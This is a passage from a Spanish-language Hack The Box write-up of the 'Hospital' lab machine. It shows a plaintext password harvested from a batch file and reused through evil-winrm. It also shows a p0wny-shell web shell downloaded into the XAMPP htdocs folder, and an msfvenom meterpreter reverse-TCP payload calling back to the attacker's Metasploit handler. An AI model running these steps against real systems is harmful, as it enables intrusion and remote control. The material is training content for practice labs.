+connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.241] 6171
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.4974]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;whoami
+<span class="nb">whoami
+</span>hospital<span class="se">\d</span>rbrown
+
+C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<h2 id="usertxt">User.txt</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;type C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+9094302029572892e53320578b26c0b0
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<ul>
+  <li>En el directorio de <code class="language-plaintext highlighter-rouge">Documents</code> podemos ver que allí se encuentra el <code class="language-plaintext highlighter-rouge">.bat</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments
+
+05/12/2024  12:36 AM    &lt;DIR&gt;          <span class="nb">.</span>
+05/12/2024  12:36 AM    &lt;DIR&gt;          ..
+10/23/2023  03:33 PM               373 ghostscript.bat
+05/12/2024  12:36 AM            28,160 nc.exe
+               2 File<span class="o">(</span>s<span class="o">)</span>         28,533 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,184,203,264 bytes free
+
+C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;type ghostscript.bat
+<span class="nb">type </span>ghostscript.bat
+@echo off
+<span class="nb">set </span><span class="nv">filename</span><span class="o">=</span>%~1
+powershell <span class="nt">-command</span> <span class="s2">"</span><span class="nv">$p</span><span class="s2"> = convertto-securestring 'chr!</span><span class="nv">$br0wn</span><span class="s2">' -asplain -force;</span><span class="nv">$c</span><span class="s2"> = new-object system.management.automation.pscredential('hospital</span><span class="se">\d</span><span class="s2">rbrown', </span><span class="nv">$p</span><span class="s2">);Invoke-Command -ComputerName dc -Credential </span><span class="nv">$c</span><span class="s2"> -ScriptBlock { cmd.exe /c "</span>C:<span class="se">\P</span>rogram<span class="sb">`</span> Files<span class="se">\g</span>s<span class="se">\g</span>s10.01.1<span class="se">\b</span><span class="k">in</span><span class="se">\g</span>swin64c.exe<span class="s2">" -dNOSAFER "</span>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ownloads<span class="se">\%</span>filename%<span class="s2">" }"</span>
+C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos la credencial del <code class="language-plaintext highlighter-rouge">Dr.Brown:chr!$br0wn</code> vamos a validarlas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ cme smb 10.10.11.241 <span class="nt">-u</span> <span class="s1">'drbrown'</span> <span class="nt">-p</span> <span class="s1">'chr!$br0wn'</span>
+SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.241    445    DC               <span class="o">[</span>+] hospital.htb<span class="se">\d</span>rbrown:chr!<span class="nv">$br0wn</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos usar evil-winrm para mas comodo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme winrm 10.10.11.241 <span class="nt">-u</span> <span class="s1">'drbrown'</span> <span class="nt">-p</span> <span class="s1">'chr!$br0wn'</span>
+SMB         10.10.11.241    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span>
+HTTP        10.10.11.241    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.241:5985/wsman
+WINRM       10.10.11.241    5985   DC               <span class="o">[</span>+] hospital.htb<span class="se">\d</span>rbrown:chr!<span class="nv">$br0wn</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>
+
+➜  content evil-winrm <span class="nt">-i</span> 10.10.11.241 <span class="nt">-u</span> <span class="s1">'drbrown'</span> <span class="nt">-p</span> <span class="s1">'chr!$br0wn'</span>
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>hospital<span class="se">\d</span>rbrown
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Nada interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Si probamos el <code class="language-plaintext highlighter-rouge">winpeas</code> <a href="https://github.com/peass-ng/PEASS-ng/releases">https://github.com/peass-ng/PEASS-ng/releases</a> al ejecutar esto encontramos lo siguiente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications <span class="nt">--Via</span> Program Files/Uninstall registry--
+È Check <span class="k">if </span>you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
+    C:<span class="se">\P</span>rogram Files<span class="se">\C</span>ommon Files
+    C:<span class="se">\P</span>rogram Files<span class="se">\d</span>esktop.ini
+    C:<span class="se">\P</span>rogram Files<span class="se">\d</span>otnet
+    C:<span class="se">\P</span>rogram Files<span class="se">\G</span>oogle
+    C:<span class="se">\P</span>rogram Files<span class="se">\g</span>s
+    C:<span class="se">\P</span>rogram Files<span class="se">\H</span>yper-V
+    C:<span class="se">\P</span>rogram Files<span class="se">\i</span>nternet explorer
+    C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft
+    C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft UCMA 4.0
+    C:<span class="se">\P</span>rogram Files<span class="se">\M</span>SBuild
+    C:<span class="se">\P</span>rogram Files<span class="se">\P</span>ackageManagement
+    C:<span class="se">\P</span>rogram Files<span class="se">\P</span>uTTY
+    C:<span class="se">\P</span>rogram Files<span class="se">\P</span>ython312
+    C:<span class="se">\P</span>rogram Files<span class="se">\R</span>eference Assemblies
+    C:<span class="se">\P</span>rogram Files<span class="se">\U</span>ninstall Information
+    C:<span class="se">\P</span>rogram Files<span class="se">\V</span>Mware
+    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender
+    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender Advanced Threat Protection
+    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Identity Foundation
+    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Mail
+    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Media Player
+    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Multimedia Platform
+    C:<span class="se">\P</span>rogram Files<span class="se">\w</span>indows nt
+    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Photo Viewer
+    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Portable Devices
+    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Security
+    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Sidebar
+    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsApps
+    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPowerShell
+    C:<span class="se">\x</span>ampp<span class="o">(</span>Users <span class="o">[</span>AppendData/CreateDirectories WriteData/CreateFiles]<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>El <code class="language-plaintext highlighter-rouge">AppendData</code> significa que podemos añadir datos o archivos o crear directorios dentro de la carpeta especificada y <code class="language-plaintext highlighter-rouge">WriteData/CreateFiles</code> nos permite escribir datos en archivos existentes o crear nuevos archivos dentro del directorio como es común en aplicaciones web o servidores que se gestionan a través de <code class="language-plaintext highlighter-rouge">XAMPP</code>. En este caso, <code class="language-plaintext highlighter-rouge">XAMPP</code>, que es un paquete que incluye <code class="language-plaintext highlighter-rouge">Apache</code>, <code class="language-plaintext highlighter-rouge">MySQL</code>, y otros componentes para servidores web, necesitaría estos permisos para operar correctamente y permitir al usuario administrar sitios web, bases de datos, y otros servicios relacionados.</p>
+  </li>
+  <li>
+    <p>Si entramos en <code class="language-plaintext highlighter-rouge">htdocs</code> encontramos archivos de configuración.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp&gt; <span class="nb">cd </span>htdocs
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----       10/22/2023  10:19 PM                bin
+d-----       10/22/2023  11:47 PM                config
+d-----       10/22/2023  10:33 PM                default
+d-----       10/22/2023  10:19 PM                installer
+d-----       10/22/2023  10:32 PM                logs
+d-----       10/22/2023  10:19 PM                plugins
+d-----       10/22/2023  10:20 PM                program
+d-----       10/22/2023  10:20 PM                skins
+d-----       10/22/2023  10:19 PM                SQL
+d-----        5/12/2024  12:41 AM                temp
+d-----       10/22/2023  10:20 PM                vendor
+<span class="nt">-a----</span>       10/16/2023  12:23 PM           2553 .htaccess
+<span class="nt">-a----</span>       10/16/2023  12:23 PM         211743 CHANGELOG.md
+<span class="nt">-a----</span>       10/16/2023  12:23 PM            994 composer.json
+<span class="nt">-a----</span>       10/16/2023  12:23 PM           1086 composer.json-dist
+<span class="nt">-a----</span>       10/16/2023  12:23 PM          56279 composer.lock
+<span class="nt">-a----</span>       10/16/2023  12:23 PM          11199 index.php
+<span class="nt">-a----</span>       10/16/2023  12:23 PM          12661 INSTALL
+<span class="nt">-a----</span>       10/16/2023  12:23 PM          35147 LICENSE
+<span class="nt">-a----</span>       10/16/2023  12:23 PM           3853 README.md
+<span class="nt">-a----</span>       10/16/2023  12:23 PM            967 SECURITY.md
+<span class="nt">-a----</span>       10/16/2023  12:23 PM           4657 UPGRADING
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Si vemos los permisos establecidos para la carpeta los permisos indican que las cuentas de servicio del sistema y los administradores tienen acceso completo, mientras que los usuarios normales tienen permisos más limitados de lectura y ejecución, con capacidades específicas para añadir o borrar datos. Esto es típico en entornos donde se necesita limitar el acceso de los usuarios comunes para prevenir cambios no autorizados en aplicaciones críticas como las que se manejan a través de XAMPP.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp&gt; icacls htdocs
+htdocs NT AUTHORITY<span class="se">\L</span>OCAL SERVICE:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+       NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+       BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+       BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX<span class="o">)</span>
+       BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>AD<span class="o">)</span>
+       BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>WD<span class="o">)</span>
+       CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+
+Successfully processed 1 files<span class="p">;</span> Failed processing 0 files
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos añadir y escribir en la carpeta si queremos ganar acceso rápido lo que podemos hacer es subir el <a href="https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</a> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  p0wny-shell git:<span class="o">(</span>master<span class="o">)</span> python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.11.241 - - <span class="o">[</span>11/May/2024 19:12:01] <span class="s2">"GET /shell.php HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; curl <span class="nt">-o</span> shell.php http://10.10.14.71:80/shell.php
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----       10/22/2023  10:19 PM                bin
+d-----       10/22/2023  11:47 PM                config
+d-----       10/22/2023  10:33 PM                default
+d-----       10/22/2023  10:19 PM                installer
+d-----       10/22/2023  10:32 PM                logs
+d-----       10/22/2023  10:19 PM                plugins
+d-----       10/22/2023  10:20 PM                program
+d-----       10/22/2023  10:20 PM                skins
+d-----       10/22/2023  10:19 PM                SQL
+d-----        5/12/2024  12:41 AM                temp
+d-----       10/22/2023  10:20 PM                vendor
+<span class="nt">-a----</span>       10/16/2023  12:23 PM           2553 .htaccess
+<span class="nt">-a----</span>       10/16/2023  12:23 PM         211743 CHANGELOG.md
+<span class="nt">-a----</span>       10/16/2023  12:23 PM            994 composer.json
+<span class="nt">-a----</span>       10/16/2023  12:23 PM           1086 composer.json-dist
+<span class="nt">-a----</span>       10/16/2023  12:23 PM          56279 composer.lock
+<span class="nt">-a----</span>       10/16/2023  12:23 PM          11199 index.php
+<span class="nt">-a----</span>       10/16/2023  12:23 PM          12661 INSTALL
+<span class="nt">-a----</span>       10/16/2023  12:23 PM          35147 LICENSE
+<span class="nt">-a----</span>       10/16/2023  12:23 PM           3853 README.md
+<span class="nt">-a----</span>       10/16/2023  12:23 PM            967 SECURITY.md
+<span class="nt">-a----</span>        5/12/2024   1:12 AM          20321 shell.php
+<span class="nt">-a----</span>       10/16/2023  12:23 PM           4657 UPGRADING
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;
+</code></pre></div></div>
+
+<h2 id="roottxt">root.txt</h2>
+
+<ul>
+  <li>Ya podemos leer la flag.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/15.png" />
+</p>
+
+<h2 id="la-otra-forma-de-escalar-privilegios">La otra forma de escalar privilegios</h2>
+
+<ul>
+  <li>En esta maquina existe otra forma de escalar privilegios si vemos las sesiones activas en el sistema vemos que hay una sesión activa por el doctor cada usuario corre tareas o servicios del sistema para enumerarlos vamos a usar <code class="language-plaintext highlighter-rouge">Metasploit</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; qwinsta
+ SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
+<span class="o">&gt;</span>services                                    0  Disc
+ console           drbrown                   1  Active
+ rdp-tcp                                 65536  Listen
+</code></pre></div></div>
+
+<ul>
+  <li>Lo primero que vamos a hacer ejecutarnos un <code class="language-plaintext highlighter-rouge">.exe</code> para ganar acceso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.71 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="o">&gt;</span> shell.exe
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo subimos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt; upload shell.exe
+
+Info: Uploading /home/miguel/Hackthebox/Hospital/content/shell.exe to C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop<span class="se">\s</span>hell.exe
+
+Data: 9556 bytes of 9556 bytes copied
+
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Iniciamos <code class="language-plaintext highlighter-rouge">Metasploit</code> y preparamos todo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfconsole
+Metasploit tip: Use <span class="nb">help</span> &lt;<span class="nb">command</span><span class="o">&gt;</span> to learn more about any <span class="nb">command</span>
+
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |
+  +---------------------------+---------------------------+
+  |      __________________   |                           |
+  |  <span class="o">==</span>c<span class="o">(</span>______<span class="o">(</span>o<span class="o">(</span>______<span class="o">(</span>_<span class="o">()</span>  | |<span class="s2">""""""""""""</span>|<span class="o">======[</span><span class="k">***</span>  |
+  |             <span class="o">)=</span><span class="se">\ </span>          | |  EXPLOIT   <span class="se">\ </span>           |
+  |            // <span class="se">\\</span>          | |_____________<span class="se">\_</span>______    |
+  |           //   <span class="se">\\</span>         | |<span class="o">==[</span>msf <span class="o">&gt;]============</span><span class="se">\ </span>  |
+  |          //     <span class="se">\\</span>        | |______________________<span class="se">\ </span> |
+  |         // RECON <span class="se">\\</span>       | <span class="se">\(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)</span>/   |
+  |        //         <span class="se">\\</span>      |  <span class="k">*********************</span>    |
+  +---------------------------+---------------------------+
+  |      o O o                |        <span class="se">\'\/\/\/</span><span class="s1">'/         |
+  |              o O          |         )======(          |
+  |                 o         |       .'</span>  LOOT  <span class="s1">'.        |
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
+  | |________________|__|)__| |    |     __||_)     |     |
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
+  |  = = = = = = = = = = = =  |     '</span><span class="nt">--------------</span><span class="s1">'      |
+  +---------------------------+---------------------------+
+
+
+       =[ metasploit v6.4.2-dev                           ]
++ -- --=[ 2408 exploits - 1240 auxiliary - 422 post       ]
++ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set lhost 10.10.14.71
+lhost =&gt; 10.10.14.71
+msf6 exploit(multi/handler) &gt; set lport 443
+lport =&gt; 443
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.71:443
+</span></code></pre></div></div>
+
+<ul>
+  <li>Ahora ejecutamos el <code class="language-plaintext highlighter-rouge">.exe</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt; .<span class="se">\s</span>hell.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora ya obtenemos una conexión, vamos a ver los procesos que se están corriendo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> ps
+
+Process List
+<span class="o">============</span>
+
+ PID   PPID  Name       Arch  Session  User            Path
+ <span class="nt">---</span>   <span class="nt">----</span>  <span class="nt">----</span>       <span class="nt">----</span>  <span class="nt">-------</span>  <span class="nt">----</span>            <span class="nt">----</span>
+ 0     0     <span class="o">[</span>System P
+             rocess]
+ 4     0     System
+ 48    4     Secure Sy
+             stem
+ 92    4     Registry
+ 336   4     smss.exe
+ 364   656   svchost.e
+             xe
+ 368   656   svchost.e
+             xe
+ 380   656   svchost.e
+             xe
+ 416   408   csrss.exe
+ 516   616   dwm.exe
+ 520   408   wininit.e
+             xe
+ 528   512   csrss.exe
+ 616   512   winlogon.
+             exe
+ 656   520   services.
+             exe
+ 676   520   LsaIso.ex
+             e
+ 684   520   lsass.exe
+ 784   656   svchost.e
+             xe
+ 852   656   VGAuthSer
+             vice.exe
+ 892   656   svchost.e
+             xe
+ 900   656   svchost.e
+             xe
+ 912   656   svchost.e
+             xe
+ 952   656   svchost.e
+             xe
+ 996   656   svchost.e
+             xe
+ 1016  656   svchost.e
+             xe
+ 1052  656   svchost.e
+             xe
+ 1072  656   svchost.e
+             xe
+ 1116  656   svchost.e
+             xe
+ 1164  656   svchost.e
+             xe
+ 1244  656   svchost.e
+             xe
+ 1276  656   svchost.e
+             xe
+ 1304  656   svchost.e
+             xe
+ 1324  656   svchost.e  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
+             xe                        wn              em32<span class="se">\s</span>vchost.ex
+                                                       e
+ 1336  656   svchost.e
+             xe
+ 1408  656   svchost.e
+             xe
+ 1416  656   svchost.e
+             xe
+ 1452  656   svchost.e
+             xe
+ 1520  656   svchost.e
+             xe
+ 1540  656   svchost.e
+             xe
+ 1548  656   svchost.e
+             xe
+ 1616  656   svchost.e
+             xe
+ 1624  656   svchost.e
+             xe
+ 1752  656   svchost.e
+             xe
+ 1760  656   svchost.e
+             xe
+ 1780  656   svchost.e
+             xe
+ 1792  656   svchost.e
+             xe
+ 1856  656   svchost.e
+             xe
+ 1900  656   svchost.e
+             xe
+ 1924  656   svchost.e
+             xe
+ 2060  656   svchost.e
+             xe
+ 2096  656   svchost.e
+             xe
+ 2116  656   svchost.e
+             xe
+ 2124  656   svchost.e
+             xe
+ 2424  656   SMSvcHost
+             .exe
+ 2464  656   svchost.e
+             xe
+ 2564  656   svchost.e
+             xe
+ 2700  616   fontdrvho
+             st.exe
+ 2708  520   fontdrvho
+             st.exe
+ 2748  656   svchost.e
+             xe
+ 2768  656   svchost.e
+             xe
+ 2776  656   httpd.exe
+ 2784  656   Microsoft
+             .ActiveDi
+             rectory.W
+             ebService
+             s.exe
+ 2796  656   svchost.e
+             xe
+ 2808  656   svchost.e
+             xe
+ 2852  656   dfsrs.exe
+ 2904  656   svchost.e
+             xe
+ 2924  656   dns.exe
+ 2948  656   hMailServ
+             er.exe
+ 2960  656   svchost.e
+             xe
+ 2984  656   mysqld.ex
+             e
+ 3008  656   svchost.e
+             xe
+ 3020  656   ismserv.e
+             xe
+ 3028  656   mqsvc.exe
+ 3060  656   svchost.e
+             xe
+ 3068  7396  python.ex  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
+             e                         wn              s<span class="se">\P</span>ython312<span class="se">\p</span>yt
+                                                       hon.exe
+ 3108  656   svchost.e
+             xe
+ 3120  656   dfssvc.ex
+             e
+ 3140  2124  sihost.ex  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
+             e                         wn              em32<span class="se">\s</span>ihost.exe
+ 3144  656   vmtoolsd.
+             exe
+ 3192  656   svchost.e
+             xe
+ 3236  656   vmms.exe
+ 3244  656   vm3dservi
+             ce.exe
+ 3292  656   svchost.e
+             xe
+ 3308  656   svchost.e
+             xe
+ 3316  656   svchost.e
+             xe
+ 3532  656   svchost.e
+             xe
+ 3572  3244  vm3dservi
+             ce.exe
+ 3888  656   vds.exe
+ 4116  912   wsmprovho  x64   0        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
+             st.exe                    wn              em32<span class="se">\w</span>smprovhos
+                                                       t.exe
+ 4156  2776  httpd.exe
+ 5208  656   dllhost.e
+             xe
+ 5276  912   WmiPrvSE.
+             exe
+ 5468  656   SMSvcHost
+             .exe
+ 5528  656   vmcompute
+             .exe
+ 5792  656   svchost.e
+             xe
+ 6040  912   ShellExpe  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
+             rienceHos                 wn              emApps<span class="se">\S</span>hellExp
+             t.exe                                     erienceHost_cw5
+                                                       n1h2txyewy<span class="se">\S</span>hel
+                                                       lExperienceHost
+                                                       .exe
+ 6084  656   msdtc.exe
+ 6188  6444  explorer.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\e</span>xpl
+             exe                       wn              orer.exe
+ 6256  3068  IEDriverS  x86   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\U</span>sers<span class="se">\d</span>rbrow
+             erver.exe                 wn              n.HOSPITAL<span class="se">\.</span>cac
+                                                       he<span class="se">\s</span>elenium<span class="se">\I</span>ED
+                                                       riverServer<span class="se">\w</span><span class="k">in
+                                                       </span>32<span class="se">\4</span>.14.0<span class="se">\I</span>EDri
+                                                       verServer.exe
+ 6308  7396  conhost.e  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
+             xe                        wn              em32<span class="se">\c</span>onhost.ex
+                                                       e
+ 6728  1540  taskhostw  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
+             .exe                      wn              em32<span class="se">\t</span>askhostw.
+                                                       exe
